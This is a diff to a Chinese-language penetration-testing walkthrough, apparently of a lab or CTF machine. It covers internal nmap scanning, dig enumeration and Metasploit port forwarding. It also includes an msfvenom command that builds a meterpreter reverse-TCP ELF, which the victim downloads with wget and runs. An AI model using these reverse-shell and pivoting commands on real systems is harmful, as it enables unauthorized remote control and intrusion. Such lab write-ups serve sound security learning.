@@ -125,17 +125,19 @@ if __name__ == "__main__":
 ![](attachments/Pasted%20image%2020230303135918.png)
 `hardEnough4u`
 
-利用这台机器开始扫描内网，下载一个nmap `add apk nmapip addr`
+利用这台机器开始扫描内网，下载一个nmap `add apk nmap`
 内网ip为172.19.0.10，nmap扫描网段
-![](attachments/Pasted%20image%2020230303153445.png)
-扫描172.19.0.1
-![](attachments/Pasted%20image%2020230303160413.png)
+![](attachments/Pasted%20image%2020230303162353.png)
+
 dig枚举域名
-
-
+![](attachments/Pasted%20image%2020230303162921.png)
 利用msf做端口转发
+`portfwd add -l 18080 -r 172.19.0.1 -p 8080
 生成elf程序
 `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.163.129 LPORT=8080 -f elf -o shell.elf`
 受害机wget下载然后给权限运行
 ![](attachments/Pasted%20image%2020230303160933.png)
 
+现在访问127.0.0.1:18080可以看到apache的页面
+![](attachments/Pasted%20image%2020230303163134.png)
+但是没有看到cms，可能是站点域名的设置，需要更改一下host文件
